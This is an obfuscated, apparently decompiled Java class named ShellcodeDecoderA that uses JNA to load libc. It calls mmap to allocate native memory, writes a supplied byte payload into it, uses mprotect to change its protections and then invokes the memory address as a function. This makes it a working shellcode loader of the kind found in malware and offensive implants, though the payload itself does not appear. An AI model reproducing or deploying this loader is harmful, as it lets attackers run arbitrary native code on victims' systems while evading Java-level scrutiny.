import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;

public final class ShellcodeDecoderA implements PayloadDecoder {
   private static NativeLibrary a;

   private static NativeLibrary a() {
      if (a == null) {
         try {
            a = NativeLibrary.getInstance("libc");
         } catch (Throwable var1) {
            try {
               a = NativeLibrary.getInstance("libc.so.6");
            } catch (Throwable var0) {
               a = NativeLibrary.getInstance("libc.so");
            }
         }
      }

      return a;
   }

   @Override
   public final void a(long var1, byte[] var3, int var4) {
      new Pointer(var1).write(0L, var3, 0, var4);
   }

   @Override
   public final int a(long var1, long var3, int var5) {
      Pointer var6;
      return (var6 = a().getFunction("mprotect").invokePointer(new Object[]{new Pointer(var1), new Pointer(var3), var5})) == null
         ? 0
         : (int)Pointer.nativeValue(var6);
   }

   @Override
   public final int a(long var1, long var3) {
      Pointer var5;
      return (var5 = a().getFunction("munmap").invokePointer(new Object[]{new Pointer(var1), new Pointer(var3)})) == null ? 0 : (int)Pointer.nativeValue(var5);
   }

   @Override
   public final long a(long var1, int var3, int var4) {
      Pointer var5;
      return (var5 = a().getFunction("mmap").invokePointer(new Object[]{new Pointer(0L), new Pointer(var1), var3, var4, -1, new Pointer(0L)})) == null
         ? 0L
         : Pointer.nativeValue(var5);
   }

   @Override
   public final long a(long var1, long var3, long var5) {
      Pointer var7;
      return (
               var7 = Function.getFunction(new Pointer(var1))
                  .invokePointer(new Object[]{new Pointer(var3), new Pointer(var5), new Pointer(0L), new Pointer(0L)})
            )
            == null
         ? 0L
         : Pointer.nativeValue(var7);
   }
}
